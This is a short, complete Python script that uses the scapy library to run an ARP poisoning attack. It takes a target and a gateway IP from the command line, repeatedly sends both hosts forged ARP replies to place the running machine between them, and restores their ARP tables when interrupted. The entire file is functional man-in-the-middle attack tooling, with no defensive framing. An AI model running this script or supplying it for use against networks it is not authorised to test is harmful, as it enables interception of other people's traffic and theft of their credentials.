import scapy.all as scapy
import optparse
import time

def get_user_input():
    parse_obj = optparse.OptionParser()
    parse_obj.add_option("-t","--target",dest="target_ip")
    parse_obj.add_option("-g","--gateway",dest="gateway_ip")

    options = parse_obj.parse_args()[0]
    if not options.target_ip or not options.gateway_ip:
        print("Please enter both options correctly.")
        exit(0)

    return options

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined, timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def arp_poison(ip1,ip2):
    target_mac = get_mac_address(ip1)

    arp_response = scapy.ARP(op=2,pdst=ip1,hwdst=target_mac,psrc=ip2)
    scapy.send(arp_response,verbose=False)

def reset_operation(ip1,ip2):
    target_mac=get_mac_address(ip1)
    poisoned_mac=get_mac_address(ip2)
    arp_response = scapy.ARP(op=2,pdst=ip1,hwdst=target_mac,psrc=ip2,hwsrc=poisoned_mac)
    scapy.send(arp_response,verbose=False,count=6)

number = 0
options = get_user_input()
try:
    while True:
        arp_poison(options.target_ip,options.gateway_ip)
        arp_poison(options.gateway_ip,options.target_ip)
        number += 1
        print("\rSending Packets",number,end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit and Reset")
    reset_operation(options.target_ip,options.gateway_ip)
    reset_operation(options.gateway_ip,options.target_ip)
